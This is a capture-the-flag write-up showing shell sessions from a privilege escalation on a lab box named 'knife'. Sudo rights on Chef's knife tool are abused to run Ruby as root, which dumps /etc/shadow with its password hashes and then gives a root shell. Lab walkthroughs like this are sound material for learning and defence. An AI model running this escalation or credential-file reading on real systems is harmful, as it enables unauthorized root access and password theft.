## Found an interesting file root.rb-

```bash
james@knife:~$ ls -la
total 52
drwxr-xr-x 5 james james 4096 May 30 18:29 .
drwxr-xr-x 3 root  root  4096 May  6 14:44 ..
lrwxrwxrwx 1 james james    9 May 10 16:23 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Feb 25  2020 .bashrc
drwx------ 2 james james 4096 May  6 14:45 .cache
drwxrwxr-x 3 james james 4096 May  6 16:32 .local
-rw-r--r-- 1 james james  807 Feb 25  2020 .profile
-rw-r--r-- 1 james james   20 May 30 18:11 roote
-rw-r--r-- 1 james james   30 May 30 18:29 root.rb
-rw-rw-r-- 1 james james   66 May  7 14:16 .selected_editor
drwx------ 2 james james 4096 May 30 17:50 .ssh
-r-------- 1 james james   33 May 30 17:43 user.txt
-rw------- 1 james james 1668 May 30 17:50 .viminfo
james@knife:~$ cat root.rb 
puts File.read('/etc/shadow')
```
#### But we can't execute it as there is no ruby  installed on the machine.
## sudo -l

```bash
james@knife:~$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

####  When we run `sudo -l` there is a file called `knife` which we run with sudo `privilege` and when we see that file inside `/usr/bin/knife` we see a symlink with the file inside `/opt/chef-workstation/bin/knife`

```bash
james@knife:~$ ls -la /usr/bin/knife
lrwxrwxrwx 1 root root 31 May  7 11:03 /usr/bin/knife -> /opt/chef-workstation/bin/knife
```

#### When we go inside `/opt/chef-workstation` directory then we known that it's a `ruby` installation directory-

```bash
james@knife:/opt/chef-workstation$ cd /opt/chef-workstation/
james@knife:/opt/chef-workstation$ ls -la
total 184
drwxr-xr-x 7 root root  4096 May 18 13:20 .
drwxr-xr-x 5 root root  4096 May 18 13:20 ..
drwxr-xr-x 2 root root  4096 May 18 13:20 bin
drwxr-xr-x 3 root root  4096 May 18 13:20 components
drwxr-xr-x 9 root root  4096 May 18 13:20 embedded
-rw-r--r-- 1 root root 13175 Feb 15 22:06 gem-version-manifest.json
drwxr-xr-x 2 root root  4096 May 18 13:20 gitbin
-rw-r--r-- 1 root root 85859 Feb 15 22:06 LICENSE
drwxr-xr-x 2 root root 36864 May 18 13:20 LICENSES
-rw-r--r-- 1 root root 13681 Feb 15 22:06 version-manifest.json
-rw-r--r-- 1 root root  4287 Feb 15 22:06 version-manifest.txt
```

#### It's mean we can `execute` ruby files and commands with `/usr/bin/knife` not with the ruby command that's why we can't execute that file `root.rb` inside james home directory-

```bash
james@knife:~$ sudo /usr/bin/knife exec root.rb 
root:$6$LCKz7Uz/FuWPPJ6o$LaOquetpLJIhOzr7YwJzFPX4NdDDHokHtUz.k4S1.CY7D/ECYVfP4Q5eS43/PMtsOa5up1ThgjB3.xUZsHyHA1:18754:0:99999:7:::
daemon:*:18659:0:99999:7:::
bin:*:18659:0:99999:7:::
sys:*:18659:0:99999:7:::
sync:*:18659:0:99999:7:::
games:*:18659:0:99999:7:::
man:*:18659:0:99999:7:::
lp:*:18659:0:99999:7:::
mail:*:18659:0:99999:7:::
news:*:18659:0:99999:7:::
uucp:*:18659:0:99999:7:::
proxy:*:18659:0:99999:7:::
www-data:*:18659:0:99999:7:::
backup:*:18659:0:99999:7:::
list:*:18659:0:99999:7:::
irc:*:18659:0:99999:7:::
gnats:*:18659:0:99999:7:::
nobody:*:18659:0:99999:7:::
systemd-network:*:18659:0:99999:7:::
systemd-resolve:*:18659:0:99999:7:::
systemd-timesync:*:18659:0:99999:7:::
messagebus:*:18659:0:99999:7:::
syslog:*:18659:0:99999:7:::
_apt:*:18659:0:99999:7:::
tss:*:18659:0:99999:7:::
uuidd:*:18659:0:99999:7:::
tcpdump:*:18659:0:99999:7:::
landscape:*:18659:0:99999:7:::
pollinate:*:18659:0:99999:7:::
usbmux:*:18753:0:99999:7:::
sshd:*:18753:0:99999:7:::
systemd-coredump:!!:18753::::::
james:$6$S4BgtW0nZi/8w.C0$pREFaCmQmAue0cm6eTgvF.vFdhsIdTr5q6PdrMVNCw4hc7TmlSqAcgMz0yOBG7mT6GcoH9gGbo.zLLG/VeT31/:18754:0:99999:7:::
lxd:!:18753::::::
```

#### Let's edit the file to get the `root` privileges-

![[Pasted image 20210530143600.png]]

```bash
james@knife:~$ nano root.rb
james@knife:~$ sudo /usr/bin/knife exec root.rb
james@knife:~$ /bin/bash -p
bash-5.0# whomai
bash: whomai: command not found
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# ls
delete.sh  root.txt  snap
bash-5.0# cat root.txt 
bc878a6439c82943bab66a2b07550e56
```



PAWNED!!!